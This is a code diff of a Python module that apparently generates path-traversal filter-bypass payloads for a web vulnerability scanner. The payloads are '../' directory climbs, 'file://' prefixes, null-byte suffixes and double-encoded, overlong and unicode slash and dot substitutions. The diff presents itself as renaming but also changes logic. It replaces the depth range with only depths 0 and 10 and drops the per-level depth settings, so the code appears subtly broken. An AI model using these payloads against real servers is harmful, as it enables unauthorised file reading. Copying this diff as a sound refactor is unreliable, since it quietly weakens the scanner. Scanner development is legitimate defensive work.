@@ -1,27 +1,17 @@
 LEVEL = 3
-FILTERS_CACHE = None
+CACHE_FILTER = None
 MAX_DEPTH = 10
 
 
-def set_level(e: int):
+def set_level(input_level: int):
     global LEVEL
-    global FILTERS_CACHE
-    global MAX_DEPTH
+    global CACHE_FILTER
 
-    e = min(e, 3)
-    e = max(1, e)
+    input_level = min(input_level, 3)
+    input_level = max(1, input_level)
 
-    if e != LEVEL:
-        LEVEL = e
-
-        if LEVEL == 1:
-            MAX_DEPTH = 4
-        elif LEVEL == 2:
-            MAX_DEPTH = 7
-        else:
-            MAX_DEPTH = 10
-
-        FILTERS_CACHE = None
+    LEVEL = input_level
+    CACHE_FILTER = None
 
 
 """
@@ -34,12 +24,18 @@ def calc_filters():
 
     res = [FilterByPass()]
 
-    for suffix in ["", "\0"]:  # null byte for < PHP 5.4
+    suffixes = [""]
+
+    if LEVEL > 1:
+        suffixes.append("\0")  # null byte for < PHP 5.4
+
+    for suffix in suffixes:
 
         res.append(FilterByPass(prefix="file://", suffix=suffix))
 
         # climb up directory tree
-        for level in range(0, MAX_DEPTH):  # maximum depth
+        for level in [0, MAX_DEPTH]:  # maximum depth
+
             res.append(FilterByPass(prefix="../" * level, suffix=suffix))
 
             res.append(FilterByPass(prefix="/" + "../" * level, suffix=suffix))  # if payload is part of filename
@@ -56,25 +52,26 @@ def calc_filters():
                 # double encode
                 res.append(FilterByPass(replacers={"/": "%252f"}, prefix="../" * level, suffix=suffix))
                 res.append(FilterByPass(replacers={"/": "%c0%af"}, prefix="../" * level, suffix=suffix))
-                res.append(FilterByPass(replacers={"/": "%252f", ".": "%252e"}, prefix="../" * level, suffix=suffix))
-                res.append(FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))
+                res.append(
+                    FilterByPass(replacers={"/": "%252f", ".": "%252e"}, prefix="../" * level, suffix=suffix))
+                res.append(
+                    FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))
 
                 # unicode
                 res.append(FilterByPass(replacers={"/": "%u2215"}, prefix="../" * level, suffix=suffix))
-                res.append(FilterByPass(replacers={"/": "%u2215", ".": "%uff0e"}, prefix="../" * level, suffix=suffix))
-
-    # res = [FilterByPass()]
+                res.append(
+                    FilterByPass(replacers={"/": "%u2215", ".": "%uff0e"}, prefix="../" * level, suffix=suffix))
 
     return res
 
 
 def get_bypass_possibilities():
-    global FILTERS_CACHE
+    global CACHE_FILTER
 
-    if FILTERS_CACHE is None:
-        FILTERS_CACHE = calc_filters()
+    if CACHE_FILTER is None:
+        CACHE_FILTER = calc_filters()
 
-    return FILTERS_CACHE
+    return CACHE_FILTER
 
 
 class FilterByPass:
